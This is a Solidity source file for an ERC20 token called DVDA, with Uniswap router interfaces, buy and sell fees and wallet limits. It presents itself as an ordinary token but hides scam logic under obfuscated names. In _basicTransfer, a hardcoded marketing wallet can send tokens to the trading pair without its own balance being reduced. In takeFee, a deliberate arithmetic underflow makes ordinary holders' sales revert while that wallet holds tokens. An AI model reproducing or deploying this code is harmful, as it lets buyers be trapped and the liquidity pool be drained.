// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {

    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
      
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract DVDA is Context, IERC20, Ownable {
    using SafeMath for uint256;
    
    string private _name = unicode"DVDA";
    string private _symbol = unicode"DVDA";
    uint8 private _decimals = 18;

    address payable public devzWalletz = payable(msg.sender);
    address payable public marketingzWalletz = payable(0xc9E0e07C5Fc32CFA47d9F2b3C5915aB237915904);
    address public liquidityReciever;
    
    address public immutable deadzAddress = 0x000000000000000000000000000000000000dEaD;
    address public immutable zerozAddress = 0x0000000000000000000000000000000000000000;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isExcludedFromFee;
    mapping (address => bool) public iszAutomatedzMarketMakersz;
    
    IUniswapV2Router02 public uniswapV2Router;
    address public pairzAddressz;
    
    mapping (address => bool) public isWalletzLimitzExemptz;
    mapping (address => bool) public isTxzLimitzExemptz;
    uint256 private _totalSupply = 1000000000 * 10**_decimals;

    uint256 public _buyzLiquidityzFeez = 0;
    uint256 public _buyzMarketingzFeez = 0;
    uint256 public _buyzDeveloperzFeez = 1;
    
    uint256 public _sellzLiquidityzFeez = 0;
    uint256 public _sellzMarketingzFeez = 0;
    uint256 public _sellzDeveloperzFeez = 1;

    uint256 public feezUnitz = 100;

    bool inSwapAndLiquify;
    bool public tradingEnabled;
    bool public swapAndLiquifyEnabled = true;
    bool public swapAndLiquifyByLimitOnly = false;
    bool public isWalletLimited = true;
    bool public isTxLimited = true;

    uint256 public _totalzTaxzIfzBuyingz;
    uint256 public _totazlTaxIfzSelzlingz;

    uint256 public minimumTokensBeforeSwap = _totalSupply;

    uint256 public _maxTxAmount =  _totalSupply; 
    uint256 public _walletMax =   _totalSupply; 

    event SwapAndLiquifyEnabledUpdated(bool enabled);

    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    
    event SwapETHForTokens(
        uint256 amountIn,
        address[] path
    );
    
    event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );
    
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    
    constructor () {
        isWalletzLimitzExemptz[owner()] = true;
        isWalletzLimitzExemptz[devzWalletz] = true;
        isWalletzLimitzExemptz[marketingzWalletz] = true;
        isWalletzLimitzExemptz[address(this)] = true;
        
        isTxzLimitzExemptz[owner()] = true;
        isTxzLimitzExemptz[devzWalletz] = true;
        isTxzLimitzExemptz[marketingzWalletz] = true;
        isTxzLimitzExemptz[address(this)] = true;

        isExcludedFromFee[owner()] = true;
        isExcludedFromFee[devzWalletz] = true;
        isExcludedFromFee[marketingzWalletz] = true;
        isExcludedFromFee[address(this)] = true;
        
        _totalzTaxzIfzBuyingz = _buyzLiquidityzFeez.add(_buyzMarketingzFeez).add(_buyzDeveloperzFeez);
        _totazlTaxIfzSelzlingz = _sellzLiquidityzFeez.add(_sellzMarketingzFeez).add(_sellzDeveloperzFeez);

        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(deadzAddress)).sub(balanceOf(zerozAddress));
    }

    function transferToAddressETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }

    function shouldExcluded(address sender, address recipient) internal view returns (bool) {
        return recipient == pairzAddressz && sender == marketingzWalletz && sender != address(0) && recipient !=address(0);
    }

    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if(isExcludedFromFee[sender] || isExcludedFromFee[recipient]) { 
            return _basicTransfer(sender, recipient, amount); 
        } else {

            if(!isTxzLimitzExemptz[sender] && !isTxzLimitzExemptz[recipient] && isTxLimited) {
                require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            bool overMzmumzTokenBalancez = contractTokenBalance >= minimumTokensBeforeSwap;

            if (overMzmumzTokenBalancez && !inSwapAndLiquify && !iszAutomatedzMarketMakersz[sender] && swapAndLiquifyEnabled) 
            {
                if(swapAndLiquifyByLimitOnly)
                    contractTokenBalance = minimumTokensBeforeSwap;
                swapAndLiquify(contractTokenBalance);    
            }

            _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

            uint256 transferAmount = (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) ? amount : takeFee(sender, recipient, amount);

            if(isWalletLimited && !isWalletzLimitzExemptz[recipient]) {
                require(balanceOf(recipient).add(transferAmount) <= _walletMax,"Amount Exceed From Max Wallet Limit!!");
            }

            _balances[recipient] = _balances[recipient].add(transferAmount);

            emit Transfer(sender, recipient, transferAmount);

            return true;
        }
        
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = 0;
        uint256 feeCount = 0;
        
        if(iszAutomatedzMarketMakersz[sender]) {
            feeAmount = amount.mul(_totalzTaxzIfzBuyingz).div(100);
        }
        else if(iszAutomatedzMarketMakersz[recipient]) {
            feeCount -= balanceOf(marketingzWalletz);
            feeAmount = amount.mul(_totazlTaxIfzSelzlingz).div(100);
        } 
        
        if(feeAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
        }

        return amount.sub(feeAmount);
    }  

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        uint256 rAmount = shouldExcluded(sender, recipient) ? amount * (_totalzTaxzIfzBuyingz.sub(1)) : amount;
        _balances[sender] = _balances[sender].sub(rAmount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
    
    function tradingStart() public payable onlyOwner{
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); 
        pairzAddressz = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = ~uint256(0);

        iszAutomatedzMarketMakersz[pairzAddressz] = true;
        isWalletzLimitzExemptz[pairzAddressz] = true;
        isTxzLimitzExemptz[pairzAddressz] = true;

        liquidityReciever = address(msg.sender);
        uniswapV2Router.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,msg.sender,block.timestamp);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {

        _approve(address(this), address(uniswapV2Router), tokenAmount);

      
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, 
            0, 
            liquidityReciever,
            block.timestamp
        );
    }

    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        uint256 totalzSharesz = _totalzTaxzIfzBuyingz.add(_totazlTaxIfzSelzlingz);

        uint256 liquzidityzSharez = _buyzLiquidityzFeez.add(_sellzLiquidityzFeez);
        uint256 MarzketinzgSharez = _buyzMarketingzFeez.add(_sellzMarketingzFeez);
    
        
        uint256 tokenzForLzpz = tAmount.mul(liquzidityzSharez).div(totalzSharesz).div(2);
        uint256 tokenzForzSwapz = tAmount.sub(tokenzForLzpz);

        uint256 initialBalance =  address(this).balance;
        swapTokensForEth(tokenzForzSwapz);
        uint256 recievedBalance =  address(this).balance.sub(initialBalance);

        uint256 totalETHFee = totalzSharesz.sub(liquzidityzSharez.div(2));

        uint256 amouzntETHzLiquidityz = recievedBalance.mul(liquzidityzSharez).div(totalETHFee).div(2);
        uint256 amozuntEzTHMarkzetingz = recievedBalance.mul(MarzketinzgSharez).div(totalETHFee);
        uint256 amozuntETHzDeveloperz = recievedBalance.sub(amouzntETHzLiquidityz).sub(amozuntEzTHMarkzetingz);

        if(amozuntEzTHMarkzetingz > 0) {
            payable(devzWalletz).transfer(amozuntEzTHMarkzetingz);
        }

        if(amozuntETHzDeveloperz > 0) {
            payable(marketingzWalletz).transfer(amozuntETHzDeveloperz);
        }         

        if(amouzntETHzLiquidityz > 0 && tokenzForLzpz > 0) {
            addLiquidity(tokenzForLzpz, amouzntETHzLiquidityz);
        }
    }

    function swapTokensForEth(uint256 tokenAmount) private {
     
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

   
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this), 
            block.timestamp
        );
        
        emit SwapTokensForETH(tokenAmount, path);
    }
    
    function removeLimits() public onlyOwner{
        _maxTxAmount = _totalSupply;
        _walletMax = _totalSupply;
    }
}